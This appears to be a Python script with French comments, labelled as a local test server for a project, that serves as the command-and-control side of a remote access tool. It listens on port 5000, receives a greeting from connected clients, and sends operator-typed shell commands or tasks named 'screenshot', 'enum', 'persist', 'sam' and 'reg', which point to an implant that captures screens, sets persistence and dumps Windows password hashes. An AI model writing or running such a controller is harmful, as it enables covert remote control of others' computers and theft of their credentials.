# test_server.py — serveur de test local (à supprimer avant le rendu)
import socket, threading, json

def encode(m): return (json.dumps(m) + "\n").encode()

def recv_line(f):
    line = f.readline()
    return json.loads(line.decode()) if line else None

def handle(conn, addr):
    print(f"\n[+] {addr} connecté")
    f = conn.makefile("rb")
    hello = recv_line(f)
    print(f"[hello] {json.dumps(hello, indent=2, ensure_ascii=False)}\n")

    try:
        while True:
            cmd = input("cmd> ").strip()
            if not cmd:
                continue
            if cmd in ("quit", "exit"):
                break
            # Types spéciaux reconnus
            if cmd in ("screenshot", "enum", "persist", "sam", "reg"):
                conn.sendall(encode({"type": cmd}))
            else:
                conn.sendall(encode({"type": "command", "command": cmd}))

            result = recv_line(f)
            if result is None:
                print("[-] client déconnecté")
                break
            print(f"[result]\n{result.get('result')}\n")
    finally:
        conn.close()

srv = socket.socket()
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", 5000))
srv.listen(5)
print("[*] Serveur test sur 0.0.0.0:5000\n")
while True:
    c, a = srv.accept()
    threading.Thread(target=handle, args=(c, a), daemon=True).start()